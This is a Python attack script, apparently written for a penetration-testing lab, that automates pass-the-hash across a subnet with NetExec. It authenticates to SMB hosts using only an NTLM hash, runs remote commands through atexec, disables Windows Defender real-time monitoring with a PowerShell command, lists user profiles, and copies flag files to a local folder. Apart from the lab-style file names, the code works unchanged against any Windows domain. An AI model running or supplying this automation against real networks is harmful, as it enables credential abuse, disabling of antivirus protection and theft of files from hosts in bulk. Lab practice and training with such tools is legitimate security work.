import os
import subprocess

# Prompt the user for inputs
subnet = input("Enter the subnet (e.g., 172.16.147.0/24): ")
username = input("Enter the username (e.g., administrator): ")
hash_value = input("Enter the NTLM hash for the user: ")
domain = input("Enter the domain (e.g., cowmotors.com): ").lower()  # Convert domain input to lowercase

# Directory to save the retrieved flags (in the domain-specific directory)
output_dir = f"flags/{domain}"
os.makedirs(output_dir, exist_ok=True)

# Function to scan the subnet for SMB-accessible hosts using `nxc smb`
def scan_smb_hosts(subnet, domain):
    command = ["nxc", "smb", subnet]
    try:
        print(f"Scanning subnet {subnet} for SMB hosts...")
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        print(f"SMB scan result: {result.stdout}")  # Print the full output for debugging
        
        # Extract IP addresses from lines starting with "SMB" and filter by the specified domain
        accessible_hosts = []
        detected_domains = set()  # Use a set to keep unique domains
        for line in result.stdout.splitlines():
            if line.startswith("SMB"):
                parts = line.split()
                ip = parts[1]
                # Extract domain from the part of the line that contains "(domain:<domain_name>)"
                domain_part = line.split("(domain:")[-1].split(")")[0]  # Extract domain between parentheses
                detected_domains.add(domain_part.lower())  # Add to the set (case-insensitive)
                if domain_part.lower() == domain.lower():  # Ensure the domain matches
                    accessible_hosts.append(ip)

        # Sort and print unique domains
        sorted_domains = sorted(detected_domains)
        print(f"Detected domains: {', '.join(sorted_domains)}")  # Print sorted unique domains

        return accessible_hosts
    except Exception as e:
        print(f"Error scanning SMB hosts: {e}")
        return []


# Function to list users in C:\Users using -x "dir c:\users"
def list_users(ip):
    command = [
        "nxc", "smb", ip,
        "-u", f"{domain}\\{username}",
        "-H", hash_value,
        "-d", domain,  # Add the domain to the command
        "--exec-method", "atexec",  # Ensure we are using atexec method
        "-x", "dir c:\\users"
    ]
    try:
        print(f"Listing users on {ip}...")
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        users = []
        for line in result.stdout.splitlines():
            # Only process directories that are not system folders (Public, Default, All Users, etc.)
            if "<DIR>" in line:
                parts = line.split()
                if len(parts) > 4:  # Ensure there's enough data in the line
                    user = parts[-1]  # Directory name is the last part
                    # Filter out invalid directories (such as ".", "..", and system directories)
                    if user.lower() not in ["public", "default", "all users", "default user", "administrator", ".", ".."]:
                        users.append(user)
        return users
    except subprocess.CalledProcessError as e:
        # If the command fails (due to a WMI exec issue), return an empty list and try disabling Defender
        print(f"Error listing users on {ip}: {e}")
        return []

# Function to retrieve a file
def retrieve_file(ip, remote_path, output_name, domain):
    output_file = os.path.join(output_dir, f"{ip}-{output_name}")
    command = [
        "nxc", "smb", ip,
        "-u", f"{domain}\\{username}",
        "-H", hash_value,
        "-d", domain,  # Add the domain to the command
        "--exec-method", "atexec",  # Ensure we are using atexec method
        "--get-file",
        remote_path,
        output_file
    ]
    try:
        print(f"Retrieving {remote_path} from {ip}...")
        subprocess.run(command, check=True)
        print(f"File saved to {output_file}")
    except subprocess.CalledProcessError:
        print(f"Failed to retrieve {remote_path} from {ip}")

# Function to disable Windows Defender
def disable_defender(ip, user_hash):
    command = [
        "nxc", "smb", ip,
        "-u", f"{domain}\\{username}",
        "-H", hash_value,
        "--exec-method", "atexec",  # Specify atexec as the execution method
        "-d", domain,  # Add the domain to the command
        "-x", "powershell Set-MpPreference -DisableRealtimeMonitoring $true"
    ]
    try:
        print(f"Disabling Windows Defender on {ip}...")
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error disabling Defender on {ip}: {e}")

# Main logic
accessible_hosts = scan_smb_hosts(subnet, domain)
print(f"Accessible SMB hosts in domain {domain}: {accessible_hosts}")

for ip in accessible_hosts:
    # Retrieve proof.txt from the Administrator's desktop
    retrieve_file(ip, r"\\Users\\Administrator\\Desktop\\proof.txt", "proof.txt", domain)
    
    # Retrieve local.txt from the Public folder
    retrieve_file(ip, r"\\Users\\Public\\local.txt", "local.txt", domain)
    
    # Initialize the users list
    users = list_users(ip)
    print(f"Users on {ip}: {users}")
    
    # If the list of users is empty due to a WMI Exec error, disable Defender and retry
    if not users:
        print(f"No users found on {ip}. Attempting to disable Defender and retrying...")
        disable_defender(ip, hash_value)  # Disable Defender
        # Retry the user listing after disabling Defender
        users = list_users(ip)
        print(f"Users on {ip} after disabling Defender: {users}")
    
    # Retrieve local.txt for each user (on the user's Desktop)
    if users:
        for user in users:
            retrieve_file(ip, fr"\\Users\\{user}\\Desktop\\local.txt", "local.txt", domain)

print("Flag retrieval complete.")
